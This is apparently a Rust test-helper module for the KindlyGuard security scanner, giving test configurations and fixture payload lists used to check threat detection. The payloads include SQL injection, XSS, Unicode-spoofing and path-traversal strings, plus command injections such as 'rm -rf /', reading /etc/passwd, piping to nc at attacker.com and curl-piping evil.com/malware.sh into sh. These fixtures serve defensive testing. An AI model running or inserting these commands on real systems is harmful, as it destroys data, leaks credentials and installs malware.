//! Common test utilities for KindlyGuard integration tests
//! 
//! This module provides shared test setup, fixtures, and helper functions
//! for the test suite.

use kindly_guard_server::{Config, McpServer, ScannerConfig, SecurityScanner};
use std::sync::Arc;

/// Create a default test scanner configuration
pub fn test_scanner_config() -> ScannerConfig {
    ScannerConfig {
        unicode_detection: true,
        injection_detection: true,
        path_traversal_detection: true,
        custom_patterns: None,
        max_scan_depth: 10,
        enable_event_buffer: false,
        xss_detection: Some(true),
        enhanced_mode: Some(false),
    }
}

/// Create a default scanner config (alias for test_scanner_config)
pub fn default_scanner_config() -> ScannerConfig {
    test_scanner_config()
}

/// Create a test scanner instance
pub fn create_test_scanner() -> Result<Arc<SecurityScanner>, Box<dyn std::error::Error>> {
    let config = test_scanner_config();
    Ok(Arc::new(SecurityScanner::new(config)?))
}

/// Create a test server configuration
pub fn test_server_config() -> Config {
    let mut config = Config::default();
    config.server.stdio = true;
    config.shield.enabled = false;
    config.auth.enabled = false;
    config.scanner = test_scanner_config();
    config
}

/// Create a test MCP server instance
pub fn create_test_server() -> Result<Arc<McpServer>, Box<dyn std::error::Error>> {
    let config = test_server_config();
    Ok(Arc::new(McpServer::new(config)?))
}

/// Common test payloads for security testing
pub mod payloads {
    /// SQL injection test payloads
    pub const SQL_INJECTIONS: &[&str] = &[
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "1' UNION SELECT * FROM passwords--",
        "admin'--",
        "' OR 1=1#",
    ];

    /// XSS test payloads
    pub const XSS_ATTACKS: &[&str] = &[
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')",
        "<svg/onload=alert('xss')>",
        "<iframe src='javascript:alert(1)'></iframe>",
    ];

    /// Unicode attack payloads
    pub const UNICODE_ATTACKS: &[&str] = &[
        "Hello\u{202E}World", // Right-to-left override
        "Test\u{200B}Hidden", // Zero-width space
        "Normal\u{2060}Text", // Word joiner
        "\u{FEFF}BOM Attack", // Zero-width no-break space
    ];

    /// Command injection payloads
    pub const COMMAND_INJECTIONS: &[&str] = &[
        "; rm -rf /",
        "`whoami`",
        "$(cat /etc/passwd)",
        "| nc attacker.com 1234",
        "&& curl evil.com/malware.sh | sh",
    ];

    /// Path traversal payloads
    pub const PATH_TRAVERSALS: &[&str] = &[
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ];
}

/// Test assertion helpers
pub mod assertions {
    use kindly_guard_server::scanner::{Threat, ThreatType};

    /// Assert that threats contain a specific threat type
    pub fn assert_contains_threat_type(threats: &[Threat], expected_type: &ThreatType) {
        assert!(
            threats.iter().any(|t| &t.threat_type == expected_type),
            "Expected threat type {:?} not found in {:?}",
            expected_type,
            threats.iter().map(|t| &t.threat_type).collect::<Vec<_>>()
        );
    }

    /// Assert that threats have minimum severity
    pub fn assert_minimum_severity(threats: &[Threat], min_severity: kindly_guard_server::scanner::Severity) {
        for threat in threats {
            assert!(
                threat.severity >= min_severity,
                "Threat {:?} has severity {:?}, expected at least {:?}",
                threat.threat_type,
                threat.severity,
                min_severity
            );
        }
    }
}

/// Async test runtime helper
/// 
/// Use this for property tests that need async runtime
pub fn with_tokio_runtime<F, R>(f: F) -> R
where
    F: FnOnce() -> R,
{
    let rt = tokio::runtime::Runtime::new().unwrap();
    let _guard = rt.enter();
    f()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_utilities_compile() {
        // Ensure our test utilities compile correctly
        let _config = test_scanner_config();
        let _server_config = test_server_config();
        assert_eq!(payloads::SQL_INJECTIONS.len(), 5);
    }
}